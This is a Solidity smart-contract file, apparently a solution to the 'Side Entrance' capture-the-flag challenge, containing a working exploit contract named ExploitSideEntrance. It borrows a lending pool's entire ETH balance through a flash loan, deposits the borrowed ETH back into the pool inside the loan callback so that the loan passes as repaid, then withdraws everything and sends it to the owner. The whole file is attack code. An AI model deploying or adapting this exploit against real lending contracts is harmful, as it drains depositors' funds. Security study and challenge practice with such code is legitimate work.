// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract LendingPoolCalled {
    address internal immutable flashloanContract;

    constructor(address _flashloanContract) {
        flashloanContract = _flashloanContract;
    }

    modifier onlyLP() {
        require(
            msg.sender == flashloanContract,
            "LENDING_POOL_CALLED: Execute not called by pool"
        );
        _;
    }
}

contract ExploitSideEntrance is LendingPoolCalled, Ownable {
    using Address for address;
    using Address for address payable;

    constructor(address _flashloanContract)
        LendingPoolCalled(_flashloanContract)
    {}

    function executeExploit() public onlyOwner {
        flashloanContract.functionCall(
            abi.encodeWithSignature(
                "flashLoan(uint256)",
                flashloanContract.balance
            )
        );

        payday();
    }

    // Called by flashloan contract
    function execute() external payable onlyLP {
        flashloanContract.functionCallWithValue(
            abi.encodeWithSignature("deposit()"),
            msg.value
        );
    }

    function payday() private {
        flashloanContract.functionCall(abi.encodeWithSignature("withdraw()"));
        payable(owner()).sendValue(address(this).balance);
    }

    receive() external payable {}
}
